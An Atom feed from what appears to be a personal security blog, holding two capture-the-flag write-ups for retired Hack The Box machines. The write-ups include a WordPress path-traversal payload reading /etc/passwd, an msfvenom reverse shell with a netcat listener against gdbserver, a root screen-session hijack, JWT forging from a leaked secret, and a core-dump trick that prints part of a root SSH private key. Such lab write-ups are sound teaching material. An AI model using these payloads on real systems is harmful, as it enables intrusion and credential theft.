<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom"><title>maggick's logs</title><link href="https://maggick.fr/" rel="alternate"></link><link href="https://maggick.fr/feeds/all-en.atom.xml" rel="self"></link><id>https://maggick.fr/</id><updated>2022-04-25T15:40:00+02:00</updated><entry><title>HTB: Backdoor</title><link href="https://maggick.fr/2022/04/htb-backdoor.html" rel="alternate"></link><published>2022-04-25T15:40:00+02:00</published><updated>2022-04-25T15:40:00+02:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2022-04-25:/2022/04/htb-backdoor.html</id><summary type="html">&lt;p&gt;&lt;img alt="Backdoor" class="align-left" src="/media/2022.04/backdoor_card.png" width="262"/&gt;&lt;/p&gt;
&lt;p&gt;This is a writeup about a retired HacktheBox machine:
&lt;a href="https://www.hackthebox.com/home/machines/profile/416"&gt;Backdoor&lt;/a&gt; publish on
November 20, 2021 by
&lt;a href="https://www.hackthebox.com/home/users/profile/79623"&gt;hkabubaker17&lt;/a&gt;.
This box is rated as an easy machine. It implies a wordpress plugin, a LFI, a
gdbserver and a screen process.&lt;/p&gt;
</summary><content type="html">&lt;p&gt;&lt;img class="align-left" src="/media/2022.04/backdoor_card.png" alt="Backdoor" width="262"&gt;&lt;/p&gt;
&lt;p&gt;This is a writeup about a retired HacktheBox machine:
&lt;a href="https://www.hackthebox.com/home/machines/profile/416"&gt;Backdoor&lt;/a&gt; publish on
November 20, 2021 by
&lt;a href="https://www.hackthebox.com/home/users/profile/79623"&gt;hkabubaker17&lt;/a&gt;.
This box is rated as an easy machine. It implies a wordpress plugin, a LFI, a
gdbserver and a screen process.&lt;/p&gt;


&lt;h1 id="foothold"&gt;Foothold&lt;/h1&gt;
&lt;h2 id="recon"&gt;Recon&lt;/h2&gt;
&lt;p&gt;Let us start as always by a &lt;code&gt;nmap&lt;/code&gt; scan. Only three TCP ports are open: 22 (SSH), 80 (HTTP) and 1337 (we don't know what
is running there).&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;# Nmap 7.92 scan initiated Tue Jan  4 08:45:39 2022 as: nmap -p- -sSV -oN notes.md 10.129.171.210&lt;/span&gt;
&lt;span class="code-line"&gt;Nmap scan report for 10.129.171.210&lt;/span&gt;
&lt;span class="code-line"&gt;Host is up (0.013s latency).&lt;/span&gt;
&lt;span class="code-line"&gt;Not shown: 65532 closed tcp ports (reset)&lt;/span&gt;
&lt;span class="code-line"&gt;PORT     STATE SERVICE VERSION&lt;/span&gt;
&lt;span class="code-line"&gt;22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)&lt;/span&gt;
&lt;span class="code-line"&gt;80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))&lt;/span&gt;
&lt;span class="code-line"&gt;1337/tcp open  waste?&lt;/span&gt;
&lt;span class="code-line"&gt;Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .&lt;/span&gt;
&lt;span class="code-line"&gt;# Nmap done at Tue Jan  4 08:46:11 2022 -- 1 IP address (1 host up) scanned in 31.95 seconds&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;The HTTP port is a basic WordPress website.&lt;/p&gt;
&lt;p&gt;&lt;img alt="WordPress homepage" src="/media/2022.04/backdoor_01.png"&gt;&lt;/p&gt;
&lt;p&gt;Looking at the installed plugin we found that ebook-download is available:&lt;/p&gt;
&lt;p&gt;&lt;img alt="ebook-download plugin" src="/media/2022.04/backdoor_02.png"&gt;&lt;/p&gt;
&lt;p&gt;This WordPress plugin is &lt;a href="https://www.exploit-db.com/exploits/39574"&gt;vulnerable to a LFI&lt;/a&gt;
that we can exploit to retrieve files on the box.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;└─$ curl http://backdoor.htb//wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../../../../../../../etc/passwd&lt;/span&gt;
&lt;span class="code-line"&gt;../../../../../../../../../etc/passwd../../../../../../../../../etc/passwd../../../../../../../../../etc/passwdroot:x:0:0:root:/root:/bin/bash&lt;/span&gt;
&lt;span class="code-line"&gt;daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;lt;SNIP&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;user:x:1000:1000:user:/home/user:/bin/bash&lt;/span&gt;
&lt;span class="code-line"&gt;lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false&lt;/span&gt;
&lt;span class="code-line"&gt;mysql:x:113:118:MySQL Server,,,:/nonexistent:/bin/false&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;lt;script&amp;gt;window.close()&amp;lt;/script&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We want to find which process is running on port 1337. We write a quick python
script that get the Max PID and list the process by PID.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;requests&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;r&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;requests&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;http://backdoor.htb//wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../../../../../proc/sys/kernel/pid_max&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;maxpid&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;int&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;text&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;132&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;31&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;maxpid&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="k"&gt;while&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;maxpid&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="n"&gt;r&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;requests&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;http://backdoor.htb//wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../../../../../proc/&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="nb"&gt;str&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;/cmdline&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;text&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;102&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;str&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;)):&lt;/span&gt;&lt;span class="mi"&gt;112&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;str&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;))]&lt;/span&gt;&lt;span class="o"&gt;!=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&amp;lt;script&amp;gt;wi&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;text&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;102&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;str&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;)):&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;31&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;+=&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We finally discover that the 1337 process is a &lt;code&gt;gdbserver&lt;/code&gt;. We also notice a
&lt;code&gt;sceen&lt;/code&gt; session running as &lt;code&gt;root&lt;/code&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;└─$ python3 l.py&lt;/span&gt;
&lt;span class="code-line"&gt;4194304&lt;/span&gt;
&lt;span class="code-line"&gt;/sbin/initautoautomatic-ubiquitynoprompt&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;lt;SNIP&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;/bin/sh-cwhile true;do su user -c &amp;quot;cd /home/user;gdbserver --once 0.0.0.0:1337 /bin/true;&amp;quot;; done&lt;/span&gt;
&lt;span class="code-line"&gt;/bin/sh -c while true;do sleep 1;find /var/run/screen/S-root/ -empty -exec screen -dmS root \;; done&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;&lt;code&gt;gdbserver&lt;/code&gt; is vulnerable to a &lt;a href="https://www.exploit-db.com/exploits/50539"&gt;RCE&lt;/a&gt;.
We generate the reverse shell, start a listener and launch the exploit. Getting
a shell as &lt;code&gt;user&lt;/code&gt; allowing use to grab the user flag.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;└─$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.26 LPORT=4444 PrependFork=true -o rev.bin&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;─$ python3 50539 backdoor.htb:1337 rev.bin&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;└─$ nc -nlvp 4444&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;listening on [any] 4444 ...&lt;/span&gt;
&lt;span class="code-line"&gt;connect to [10.10.14.26] from (UNKNOWN) [10.129.171.210] 42684&lt;/span&gt;
&lt;span class="code-line"&gt;id&lt;/span&gt;
&lt;span class="code-line"&gt;uid=1000(user) gid=1000(user) groups=1000(user)&lt;/span&gt;
&lt;span class="code-line"&gt;cat user.txt&lt;/span&gt;
&lt;span class="code-line"&gt;ee34dbf05622446ad1e9f1d35ac6d43e&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h1 id="root"&gt;Root&lt;/h1&gt;
&lt;p&gt;We create the &lt;code&gt;.ssh&lt;/code&gt; directory and put our public SSH key in the
&lt;code&gt;authorized_keys&lt;/code&gt; file in order to be more comfortable.&lt;/p&gt;
&lt;p&gt;Remember that screen process we enumerated before?&lt;/p&gt;
&lt;p&gt;&lt;code&gt;/bin/sh -c while true;do sleep 1;find /var/run/screen/S-root/ -empty -exec screen -dmS root \;; done&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;We can verify that the session is still running:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;user@Backdoor:~$ screen -ls root/root&lt;/span&gt;
&lt;span class="code-line"&gt;There is a suitable screen on:&lt;/span&gt;
&lt;span class="code-line"&gt;        3694.root       (01/05/2022 09:38:33 AM)        (Multi, detached)&lt;/span&gt;
&lt;span class="code-line"&gt;1 Socket in /run/screen/S-root.&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;And we attach it getting the root flag:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;user@Backdoor:~$ screen -x root/root&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;root@Backdoor:~# id&lt;/span&gt;
&lt;span class="code-line"&gt;uid=0(root) gid=0(root) groups=0(root)&lt;/span&gt;
&lt;span class="code-line"&gt;root@Backdoor:~# cat root.txt&lt;/span&gt;
&lt;span class="code-line"&gt;dbb5f80464c7d1489b8bba15d280195e&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h1 id="wrapping-up"&gt;Wrapping up&lt;/h1&gt;
&lt;p&gt;A quick an easy box, perfect for me as it has been a while since my last box.&lt;/p&gt;</content><category term="security"></category><category term="security"></category><category term="boot2root"></category><category term="HTB"></category><category term="wordpress"></category><category term="lfi"></category><category term="gdbserver"></category><category term="screen"></category></entry><entry><title>HTB: Secret</title><link href="https://maggick.fr/2022/03/htb-secret.html" rel="alternate"></link><published>2022-03-28T12:11:00+02:00</published><updated>2022-03-28T12:11:00+02:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2022-03-28:/2022/03/htb-secret.html</id><summary type="html">&lt;p&gt;&lt;img alt="Secret" class="align-left" src="/media/2022.03/secret_card.png" width="262"/&gt;&lt;/p&gt;
&lt;p&gt;This is a writeup about a retired HacktheBox machine:
&lt;a href="https://www.hackthebox.com/home/machines/profile/408"&gt;Secret&lt;/a&gt; publish on
October 30, 2021 by
&lt;a href="https://www.hackthebox.com/home/users/profile/485024"&gt;z9fr&lt;/a&gt;.
This box is rated as an easy machine. It implies a JWT token and its secret, as
well as a program core dump.&lt;/p&gt;
</summary><content type="html">&lt;p&gt;&lt;img class="align-left" src="/media/2022.03/secret_card.png" alt="Secret" width="262"&gt;&lt;/p&gt;
&lt;p&gt;This is a writeup about a retired HacktheBox machine:
&lt;a href="https://www.hackthebox.com/home/machines/profile/408"&gt;Secret&lt;/a&gt; publish on
October 30, 2021 by
&lt;a href="https://www.hackthebox.com/home/users/profile/485024"&gt;z9fr&lt;/a&gt;.
This box is rated as an easy machine. It implies a JWT token and its secret, as
well as a program core dump.&lt;/p&gt;


&lt;h1 id="foothold"&gt;Foothold&lt;/h1&gt;
&lt;h2 id="recon"&gt;Recon&lt;/h2&gt;
&lt;p&gt;Only a few ports are open: 22(SSH), 80 (HTTP) and 3000(also an HTTP service
here).&lt;/p&gt;
&lt;p&gt;&lt;img alt="nmap" src="/media/2022.03/secret_nmap.png"&gt;&lt;/p&gt;
&lt;p&gt;The website on port 3000, provide an API and its documentation. We can download
the source code from the site. Looking at the different commit we found that
the commit 67d8da7a0e53d8fadeb6b36396d86cdcd4f6ec78 "removed .env for security reasons"
might be interesting.&lt;/p&gt;
&lt;p&gt;&lt;img alt="git log" src="/media/2022.03/secret_gitlog.png"&gt;&lt;/p&gt;
&lt;p&gt;We look at the &lt;code&gt;git diff&lt;/code&gt; for this specific commit and found the non redacted
&lt;code&gt;TOKEN_SECRET&lt;/code&gt; for the application.&lt;/p&gt;
&lt;p&gt;&lt;img alt="git diff" src="/media/2022.03/secret_gitdiff.png"&gt;&lt;/p&gt;
&lt;p&gt;We create a python script that allow to interact with the API to create an
account, leveraging the known token secret to change our name to 'theadmin'
using &lt;a href="https://github.com/ticarpi/jwt_tool"&gt;jwt_tool&lt;/a&gt;
putting our SSH public key on the box for the 'dasith' user.&lt;/p&gt;
&lt;p&gt;&lt;a href="https://gist.github.com/maggick/af4eb7b8bc2aa3e55e3f8f02400235ee"&gt;&lt;img alt="https://gist.github.com/maggick/af4eb7b8bc2aa3e55e3f8f02400235ee" src="/media/2022.03/secret_l.py.png"&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;We can then connect using SSH and get the user flag.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$ ssh dasith@10.129.173.112&lt;/span&gt;
&lt;span class="code-line"&gt;dasith@secret:~$ cat user.txt&lt;/span&gt;
&lt;span class="code-line"&gt;7eb18a62ea270f0da664dac963a7fa05&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h1 id="root"&gt;Root&lt;/h1&gt;
&lt;p&gt;Looking at the available file and specifically the SUID ones we found interesting
stuff in &lt;code&gt;/opt&lt;/code&gt; as there is a &lt;code&gt;valgrind.log&lt;/code&gt; file, a &lt;code&gt;code.c&lt;/code&gt; file and a SUID
compiled binary. The presence of the &lt;a href="https://valgrind.org/"&gt;valgrind&lt;/a&gt; file
hint us that the binary allow for core dump.&lt;/p&gt;
&lt;p&gt;We run the SUID binary and enumerate the &lt;code&gt;/root/&lt;/code&gt; and the &lt;code&gt;/root/.ssh/&lt;/code&gt; folders.
There is a private SSH key that we want to retrieve.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;dasith@secret:/opt$ ./count&lt;/span&gt;
&lt;span class="code-line"&gt;Enter source file/directory name: /root/&lt;/span&gt;
&lt;span class="code-line"&gt;-rw-r--r--      .viminfo&lt;/span&gt;
&lt;span class="code-line"&gt;drwxr-xr-x      ..&lt;/span&gt;
&lt;span class="code-line"&gt;-rw-r--r--      .bashrc&lt;/span&gt;
&lt;span class="code-line"&gt;drwxr-xr-x      .local&lt;/span&gt;
&lt;span class="code-line"&gt;drwxr-xr-x      snap&lt;/span&gt;
&lt;span class="code-line"&gt;lrwxrwxrwx      .bash_history&lt;/span&gt;
&lt;span class="code-line"&gt;drwx------      .config&lt;/span&gt;
&lt;span class="code-line"&gt;drwxr-xr-x      .pm2&lt;/span&gt;
&lt;span class="code-line"&gt;-rw-r--r--      .profile&lt;/span&gt;
&lt;span class="code-line"&gt;drwxr-xr-x      .vim&lt;/span&gt;
&lt;span class="code-line"&gt;drwx------      .&lt;/span&gt;
&lt;span class="code-line"&gt;drwx------      .cache&lt;/span&gt;
&lt;span class="code-line"&gt;-r--------      root.txt&lt;/span&gt;
&lt;span class="code-line"&gt;drwxr-xr-x      .npm&lt;/span&gt;
&lt;span class="code-line"&gt;drwx------      .ssh&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Total entries       = 15&lt;/span&gt;
&lt;span class="code-line"&gt;Regular files       = 4&lt;/span&gt;
&lt;span class="code-line"&gt;Directories         = 10&lt;/span&gt;
&lt;span class="code-line"&gt;Symbolic links      = 1&lt;/span&gt;
&lt;span class="code-line"&gt;Save results a file? [y/N]: n&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;dasith@secret:/opt$ ./count&lt;/span&gt;
&lt;span class="code-line"&gt;Enter source file/directory name: /root/.ssh/&lt;/span&gt;
&lt;span class="code-line"&gt;drwx------      ..&lt;/span&gt;
&lt;span class="code-line"&gt;-rw-------      authorized_keys&lt;/span&gt;
&lt;span class="code-line"&gt;-rw-------      id_rsa&lt;/span&gt;
&lt;span class="code-line"&gt;drwx------      .&lt;/span&gt;
&lt;span class="code-line"&gt;-rw-r--r--      id_rsa.pub&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Total entries       = 5&lt;/span&gt;
&lt;span class="code-line"&gt;Regular files       = 3&lt;/span&gt;
&lt;span class="code-line"&gt;Directories         = 2&lt;/span&gt;
&lt;span class="code-line"&gt;Symbolic links      = 0&lt;/span&gt;
&lt;span class="code-line"&gt;Save results a file? [y/N]: n&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We run the program again and this time we "read" the SSH key. We then put the
program on background with &lt;CTRL+Z&gt; and send a
&lt;a href="https://en.wikipedia.org/wiki/Segmentation_fault"&gt;Segmentation Fault (SIGSEV)&lt;/a&gt;
to the application using &lt;code&gt;kill&lt;/code&gt; and put it back in the foreground generating a
core dump.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;dasith@secret:/opt$ ./count&lt;/span&gt;
&lt;span class="code-line"&gt;Enter source file/directory name: /root/.ssh/id_rsa&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Total characters = 2602&lt;/span&gt;
&lt;span class="code-line"&gt;Total words      = 45&lt;/span&gt;
&lt;span class="code-line"&gt;Total lines      = 39&lt;/span&gt;
&lt;span class="code-line"&gt;Save results a file? [y/N]: ^Z&lt;/span&gt;
&lt;span class="code-line"&gt;[1]+  Stopped                 ./count&lt;/span&gt;
&lt;span class="code-line"&gt;dasith@secret:/opt$ ps&lt;/span&gt;
&lt;span class="code-line"&gt;    PID TTY          TIME CMD&lt;/span&gt;
&lt;span class="code-line"&gt;  1377 pts/0    00:00:00 bash&lt;/span&gt;
&lt;span class="code-line"&gt;  1427 pts/0    00:00:00 count&lt;/span&gt;
&lt;span class="code-line"&gt;  1456 pts/0    00:00:00 ps&lt;/span&gt;
&lt;span class="code-line"&gt;dasith@secret:/opt$ kill -SIGSEGV 1427&lt;/span&gt;
&lt;span class="code-line"&gt;dasith@secret:/opt$ fg&lt;/span&gt;
&lt;span class="code-line"&gt;-bash: fg: job has terminated&lt;/span&gt;
&lt;span class="code-line"&gt;[1]+  Segmentation fault      (core dumped) ./count&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We use &lt;code&gt;appor-unpack&lt;/code&gt; to unpack our core dump file and look for the SSH key in
it.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;dasith@secret:/opt$ apport-unpack /var/crash/_opt_count.1000.crash /tmp/p&lt;/span&gt;
&lt;span class="code-line"&gt;dasith@secret:/opt$ strings /tmp/p/CoreDump&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;lt;SNIP&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Save results a file? [y/N]: l words      = 45&lt;/span&gt;
&lt;span class="code-line"&gt;Total lines      = 39&lt;/span&gt;
&lt;span class="code-line"&gt;/root/.ssh/id_rsa&lt;/span&gt;
&lt;span class="code-line"&gt;-----BEGIN OPENSSH PRIVATE KEY-----&lt;/span&gt;
&lt;span class="code-line"&gt;b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn&lt;/span&gt;
&lt;span class="code-line"&gt;NhAAAAAwEAAQAAAYEAn6zLlm7QOGGZytUCO3SNpR5vdDfxNzlfkUw4nMw/hFlpRPaKRbi3&lt;/span&gt;
&lt;span class="code-line"&gt;KUZsBKygoOvzmhzWYcs413UDJqUMWs+o9Oweq0viwQ1QJmVwzvqFjFNSxzXEVojmoCePw+&lt;/span&gt;
&lt;span class="code-line"&gt;7wNrxitkPrmuViWPGQCotBDCZmn4WNbNT0kcsfA+b4xB+am6tyDthqjfPJngROf0Z26lA1&lt;/span&gt;
&lt;span class="code-line"&gt;xw0OmoCdyhvQ3azlbkZZ7EWeTtQ/EYcdYofa8/mbQ+amOb9YaqWGiBai69w0Hzf06lB8cx&lt;/span&gt;
&lt;span class="code-line"&gt;8G+KbGPcN174a666dRwDFmbrd9nc9E2YGn5aUfMkvbaJoqdHRHGCN1rI78J7rPRaTC8aTu&lt;/span&gt;
&lt;span class="code-line"&gt;BKexPVVXhBO6+e1htuO31rHMTHABt4+6K4wv7YvmXz3Ax4HIScfopVl7futnEaJPfHBdg2&lt;/span&gt;
&lt;span class="code-line"&gt;5yXbi8lafKAGQHLZjD9vsyEi5wqoVOYalTXEXZwOrstp3Y93VKx4kGGBqovBKMtlRaic+Y&lt;/span&gt;
&lt;span class="code-line"&gt;Tv0vTW3fis9d7aMqLpuuFMEHxTQPyor3+/aEHiLLAAAFiMxy1SzMctUsAAAAB3NzaC1yc2&lt;/span&gt;
&lt;span class="code-line"&gt;EAAAGBAJ+sy5Zu0DhhmcrVAjt0jaUeb3Q38Tc5X5FMOJzMP4RZaUT2ikW4tylGbASsoKDr&lt;/span&gt;
&lt;span class="code-line"&gt;85oc1mHLONd1AyalDFrPqPTsHqtL4sENUCZlcM76hYxTUsc1xFaI5qAnj8Pu8Da8YrZD65&lt;/span&gt;
&lt;span class="code-line"&gt;rlYljxkAqLQQwmZp+FjWzU9JHLHwPm+MQfmpurcg7Yao3zyZ4ETn9GdupQNccNDpqAncob&lt;/span&gt;
&lt;span class="code-line"&gt;0N2s5W5GWexFnk7UPxGHHWKH2vP5m0Pmpjm/WGqlhogWouvcNB839OpQfHMfBvimxj3Dde&lt;/span&gt;
&lt;span class="code-line"&gt;+GuuunUcAxZm63fZ3PRNmBp+WlHzJL22iaKnR0RxgjdayO/Ce6z0WkwvGk7gSnsT1VV4QT&lt;/span&gt;
&lt;span class="code-line"&gt;uvntYbbjt9axzExwAbePuiuML+2L5l89wMeByEnH6KVZe37rZxGiT3xwXYNucl24vJWnyg&lt;/span&gt;
&lt;span class="code-line"&gt;BkBy2Yw/b7MhIucKqFTmGpU1xF2cDq7Lad2Pd1SseJBhgaqLwSjLZUWonPmE79L01t34rP&lt;/span&gt;
&lt;span class="code-line"&gt;Xe2jKi6brhTBB8U0D8qK9/v2hB4iywAAAAMBAAEAAAGAGkWVDcBX1B8C7eOURXIM6DEUx3&lt;/span&gt;
&lt;span class="code-line"&gt;t43cw71C1FV08n2D/Z2TXzVDtrL4hdt3srxq5r21yJTXfhd1nSVeZsHPjz5LCA71BCE997&lt;/span&gt;
&lt;span class="code-line"&gt;44VnRTblCEyhXxOSpWZLA+jed691qJvgZfrQ5iB9yQKd344/+p7K3c5ckZ6MSvyvsrWrEq&lt;/span&gt;
&lt;span class="code-line"&gt;Hcj2ZrEtQ62/ZTowM0Yy6V3EGsR373eyZUT++5su+CpF1A6GYgAPpdEiY4CIEv3lqgWFC3&lt;/span&gt;
&lt;span class="code-line"&gt;4uJ/yrRHaVbIIaSOkuBi0h7Is562aoGp7/9Q3j/YUjKBtLvbvbNRxwM+sCWLasbK5xS7Vv&lt;/span&gt;
